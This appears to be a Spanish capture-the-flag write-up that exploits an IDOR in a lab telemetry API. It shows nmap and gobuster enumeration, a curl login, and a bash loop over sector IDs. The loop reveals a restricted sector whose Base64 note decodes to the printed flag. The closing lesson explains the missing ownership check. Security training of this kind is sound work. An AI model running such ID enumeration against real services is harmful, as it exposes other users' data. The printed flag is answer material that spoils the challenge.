# API de sectores

> Tablero de telemetría de campo. Descarga el zip del lab (Google Drive) y ejecútalo en Kali/Linux con Docker.
>
> `chmod +x startlab.sh`
> `./startlab.sh blackout-web03.tar`
>
> El script muestra la IP del laboratorio (172.18.0.2). Enumera con nmap y ataca por HTTP. No expongas el contenedor a internet.
>
> **Consejo:** enumera la IP del lab con nmap. El tablero de campo carga la telemetría de tu zona.

**Flag:** `WHOAMI{id0r_s3ct0r21}`

---

## Resolución

El laboratorio es una app web de telemetría energética (LATAM Energía Red). Cada operador tiene asignado un "sector" y el tablero de campo le muestra la telemetría de su zona a través de una API. El fallo está en que esa API no comprueba si el sector que pides es tuyo: al pedir un sector restringido aparece la flag.

### 1. Levantar el laboratorio

```bash
$ chmod +x startlab.sh
$ ./startlab.sh blackout-web03.tar
```

El contenedor Docker arranca y el script imprime su IP. En mi entorno fue `172.17.0.2`.

### 2. Enumerar con nmap

```bash
$ nmap -sV 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Un único servicio web en el puerto 80.

### 3. Explorar la app y entrar como operador

Al pedir la raíz, el HTML ya muestra la **barra de navegación** con las cinco páginas:

```bash
$ curl -s http://172.17.0.2/ | grep btn-nav
<a class="btn-nav active" href="/index.php">Inicio</a>
<a class="btn-nav" href="/estado.php">Estado red</a>
<a class="btn-nav" href="/tablero.php">Tablero</a>
<a class="btn-nav" href="/comunidad.php">Comunidad</a>
<a class="btn-nav" href="/contacto.php">Contacto</a>
```

El tablero de campo pide entrar como operador:

```bash
$ curl -X POST -d "entrar=1" -c cookies.txt http://172.17.0.2/tablero.php
```

Esto crea una sesión PHP y devuelve el dashboard con tu sector asignado (el 14).

### 4. Descubrir el directorio `/api` con gobuster

Las páginas del menú no hablan de ninguna API, así que se fuzzean directorios ocultos:

```bash
$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -t 50
api        (Status: 301)
assets     (Status: 301)
includes   (Status: 301)
index.php  (Status: 200)
```

Aparece un directorio `/api/` que no está enlazado desde el menú — es la superficie de ataque del reto.

### 5. Descubrir el endpoint de la API

La página del tablero carga un script, `/assets/tablero.js`, que hace la petición real de telemetría:

```javascript
fetch('/api/sector/' + encodeURIComponent(id) + '/telemetry', { credentials: 'same-origin' })
```

El endpoint es `/api/sector/{id}/telemetry`. Probándolo con la sesión activa de tu sector:

```bash
$ curl -b cookies.txt http://172.17.0.2/api/sector/14/telemetry
{"id":14,"nombre":"Norte","estado":"OFFLINE","carga_mw":"0","nota":"Apagon sector 14. Esperando sync."}
```

### 6. Enumerar sectores (IDOR)

El endpoint no verifica que el sector que pides corresponda al operador. Se enumeran los IDs para ver qué sectores existen:

```bash
$ for i in {1..50}; do curl -s -b cookies.txt http://172.17.0.2/api/sector/$i/telemetry; echo; done
```

| ID | Nombre | Estado |
|----|--------|--------|
| 11 | Occidente | DEGRADADO |
| 12 | Sur | OPERATIVO |
| 13 | Central | OPERATIVO |
| 14 | Norte | OFFLINE |
| 15 | Oriente | ALERTA |
| 16 | Costa | OPERATIVO |
| 21 | Respaldo gerencia | RESTRINGIDO |

### 7. Leer la flag del sector restringido

El sector 21 (`RESTRINGIDO`) es la excepción: en vez de telemetría devuelve una cadena en Base64 dentro de `nota`:

```json
{"id":21,"nombre":"Respaldo gerencia","estado":"RESTRINGIDO","carga_mw":"n\/d","nota":"V0hPQU1Je2lkMHJfczNjdDByMjF9"}
```

Decodificando:

```bash
$ echo "V0hPQU1Je2lkMHJfczNjdDByMjF9" | base64 -d
WHOAMI{id0r_s3ct0r21}
```

## Lección

Un endpoint REST que usa un ID de recurso directo (`/api/sector/{id}`) debe validar que ese ID pertenece al usuario; solo autenticar la sesión no basta, porque permite leer recursos ajenos enumerando IDs (IDOR).